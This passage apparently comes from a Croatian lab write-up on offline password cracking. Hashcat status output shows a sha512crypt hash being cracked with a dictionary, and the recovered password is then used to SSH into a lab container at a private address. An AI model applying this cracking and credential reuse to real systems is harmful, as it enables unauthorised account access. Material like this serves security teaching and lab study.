    Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
    Progress.........: 4608/50072 (9.20%)
    Rejected.........: 0/4608 (0.00%)
    Restore.Point....: 4608/50072 (9.20%)
    Candidates.#1....: kanljl -> kkjelg
    HWMon.Dev.#1.....: N/A
    
    [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>
    #...
    $6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhjUrFccw9KL45wf0X/pEpiuB/2nJE47jS0ljb38w.CUpZbNwUJBVSplJ0:cackip
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Type........: sha512crypt $6$, SHA512 (Unix)
    Hash.Target......: $6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhj...VSplJ0
    Time.Started.....: Tue Jan  4 12:11:04 2022 (1 min, 34 secs)
    Time.Estimated...: Tue Jan  4 12:12:38 2022 (0 secs)
    Guess.Base.......: File (dictionary/g5/dictionary_offline.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.Dev.#1.....:      212 H/s (7.45ms)
    Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
    Progress.........: 20352/50072 (40.65%)
    Rejected.........: 0/20352 (0.00%)
    Restore.Point....: 20224/50072 (40.39%)
    Candidates.#1....: kztjzt -> kazpan
    HWMon.Dev.#1.....: N/A
    
    Started: Tue Jan  4 12:11:03 2022
    Stopped: Tue Jan  4 12:12:39 2022
    ```
    

**Kod zadnjeg ispisa sa statusom *Cracked, i*za dvotočke je prikazana lozinka; cackip**

**Ukoliko se pokuša spojiti na virtualni kontejner na mreži**

```bash
ssh jean_doe@10.0.15.10
jean_doe@10.0.15.10's password: cackip
```

`Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)`

**Iz predloženog, napad je uspiješan.**